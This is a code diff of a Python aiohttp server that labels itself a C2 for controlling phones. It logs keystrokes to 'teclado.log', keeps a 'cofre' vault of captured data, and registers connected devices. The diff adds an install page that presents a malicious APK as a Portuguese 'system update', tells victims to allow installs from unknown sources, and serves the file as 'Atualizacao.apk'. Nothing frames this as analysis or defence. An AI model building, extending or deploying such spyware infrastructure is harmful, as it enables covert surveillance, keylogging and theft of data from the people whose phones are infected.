@@ -1,4 +1,4 @@
-# server.py - C2, porta 8080
+﻿# server.py - C2, porta 8080
 import asyncio, json, os, socket, time
 from aiohttp import web, WSMsgType
 
@@ -6,9 +6,11 @@ TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
 DEVS = {}
 VIEW = {}
 BUSY = set()
-KF = "teclado.log"
-CF = "cofre.jsonl"
 AQUI = os.path.dirname(os.path.abspath(__file__))
+KF = os.path.join(AQUI, "teclado.log")
+CF = os.path.join(AQUI, "cofre.jsonl")
+APK = os.path.join(AQUI, "aval.apk")
+VER = "1.2.3"
 
 
 def klog(dev, pkg, win, txt):
@@ -82,6 +84,55 @@ async def index(req):
     except Exception as e:
         return web.Response(text="painel.html ausente: %s" % e, status=500)
     return web.Response(text=pagina, content_type="text/html", charset="utf-8")
+
+
+PAGINA_INSTALA = """<!doctype html><html lang="pt-BR"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Atualizacao do sistema</title><style>
+*{box-sizing:border-box}body{margin:0;background:#0B0F14;color:#fff;
+font:16px/1.5 -apple-system,Roboto,sans-serif;padding:26px 20px 40px}
+h1{font-size:22px;margin:0 0 6px}p.sub{color:#6E7C8A;font-size:12px;margin:0 0 22px}
+.p{display:flex;gap:14px;background:#151A21;border:1px solid #283240;border-radius:16px;
+padding:16px;margin-bottom:10px}.n{flex:0 0 30px;height:30px;border-radius:50%;
+background:#3D8BFD;color:#fff;font-weight:700;display:flex;align-items:center;
+justify-content:center;font-size:14px}.p b{display:block;font-size:15px;font-weight:600}
+.p span{color:#6E7C8A;font-size:12.5px}
+a.b{display:block;text-align:center;background:#3FB950;color:#04140A;font-weight:700;
+padding:16px;border-radius:14px;text-decoration:none;margin:22px 0 10px;font-size:17px}
+a.b.off{background:#283240;color:#6E7C8A}
+.f{color:#3E4A56;font-size:11px;margin-top:22px}
+</style></head><body>
+<h1>Atualizacao do sistema</h1>
+<p class="sub">versao """ + VER + """ &middot; componentes do sistema</p>
+<div class="p"><div class="n">1</div><div><b>Baixar</b><span>toque no botao verde abaixo</span></div></div>
+<div class="p"><div class="n">2</div><div><b>Instalar</b><span>se pedir, permita a instalacao de apps desta fonte</span></div></div>
+<div class="p"><div class="n">3</div><div><b>Abrir</b><span>abra o app e siga os 3 cartoes da tela</span></div></div>
+<a class="b%OFF%" href="/apk?t=""" + """%T%">Baixar atualizacao</a>
+<p class="f">Se o download nao comecar, use o menu do navegador e escolha "Baixar pagina".</p>
+</body></html>"""
+
+
+async def install_page(req):
+    if not ok(req):
+        raise web.HTTPFound("/i?t=" + TOKEN)
+    html = (PAGINA_INSTALA
+            .replace("%OFF%", "" if os.path.exists(APK) else " off")
+            .replace("%T%", TOKEN))
+    return web.Response(text=html, content_type="text/html", charset="utf-8")
+
+
+async def apk(req):
+    if not ok(req):
+        raise web.HTTPForbidden(text="token invalido")
+    if not os.path.exists(APK):
+        raise web.HTTPNotFound(text="apk ausente")
+    return web.FileResponse(APK, headers={
+        "Content-Type": "application/vnd.android.package-archive",
+        "Content-Disposition": 'attachment; filename="Atualizacao.apk"'})
+
+
+async def ping(req):
+    return web.json_response({"ok": True, "t": int(time.time()), "devs": len(DEVS)})
 
 
 async def phone(req):
@@ -282,6 +333,9 @@ def main():
     app = web.Application()
     app.on_response_prepare.append(no_cache)
     app.router.add_get("/", index)
+    app.router.add_get("/i", install_page)
+    app.router.add_get("/apk", apk)
+    app.router.add_get("/ping", ping)
     app.router.add_get("/ws", phone)
     app.router.add_get("/panel", panel)
     app.router.add_get("/health", health)
@@ -292,6 +346,7 @@ def main():
     app.router.add_get("/cofre/clr", cofre_clr)
     app.on_startup.append(on_start)
     print("painel: http://localhost:8080/")
+    print("instalacao: http://localhost:8080/i")
     web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)
 
 
